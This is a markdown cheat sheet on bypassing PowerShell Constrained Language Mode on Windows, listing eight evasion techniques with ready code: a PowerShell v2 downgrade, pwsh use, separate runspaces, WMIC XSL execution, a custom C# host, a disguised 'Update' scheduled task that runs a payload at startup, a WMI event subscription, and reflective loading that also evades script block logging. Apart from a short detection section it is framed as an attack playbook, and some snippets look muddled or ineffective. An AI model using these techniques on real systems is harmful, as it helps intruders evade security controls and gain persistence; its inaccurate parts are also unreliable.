# PowerShell Constrained Language Mode (CLM) Bypass

## Detection
```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = normal
# ConstrainedLanguage = restricted
# RestrictedLanguage = most restricted
# NoLanguage = no scripting

# Check AppLocker policy that enforces CLM
Get-AppLockerPolicy -Effective | ? {$_.RuleCollections -match "script"}
```

## What CLM Blocks
- `Add-Type` (compilation of C# code)
- COM object creation (`New-Object -ComObject`)
- Win32 API calls via DllImport
- Most .NET reflection to internal types
- Script block logging forced on
- `Start-Job`, `Invoke-Command` local loopback

## Bypass Techniques

### 1. PowerShell v2 Downgrade
```powershell
powershell.exe -Version 2
# v2 doesn't support CLM, falls back to FullLanguage
# Note: v2 may need to be installed (optional feature)
```

### 2. PowerShell Core (pwsh) Bypass
```cmd
pwsh.exe
# PowerShell Core often doesn't enforce CLM
# Check if pwsh is available
```

### 3. COM Object via DotNet (bypass CLM COM block)
```powershell
# Use .NET directly instead of COM
[System.Management.Automation.PowerShell]::Create()
```

### 4. Runspace Bypass
```powershell
# Create separate runspace with FullLanguage
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript("Add-Type -TypeDefinition 'public class P { }'").Invoke()
```

### 5. WMIC XSL Scripting
```cmd
# Execute JScript/VBScript via WMIC
wmic process call create "cmd /c ..."
# Or use XSL transformation to run scripts
wmic os get /format:"file.xsl"
```

### 6. Custom PowerShell Host
```csharp
// Write a lightweight PowerShell host in C# that doesn't enforce CLM
using (var ps = PowerShell.Create()) {
    ps.AddScript("Get-Process").Invoke();
}
// Compile with: csc.exe /reference:System.Management.Automation.dll host.cs
```

### 7. Scheduled Tasks / Services
```powershell
# Create a scheduled task that runs PowerShell (runs outside CLM context)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-c payload"
Register-ScheduledTask -TaskName "Update" -Action $action -Trigger (New-ScheduledTaskTrigger -AtStartup)
```

### 8. WMI Event Subscription
```powershell
# WMI persistence/execution bypasses CLM
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name="f"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"}
```

## PowerPick
- Reflective loading of PowerShell assemblies
- Bypasses both CLM and Script Block Logging
- Use System.Management.Automation.dll loaded via Assembly.Load()
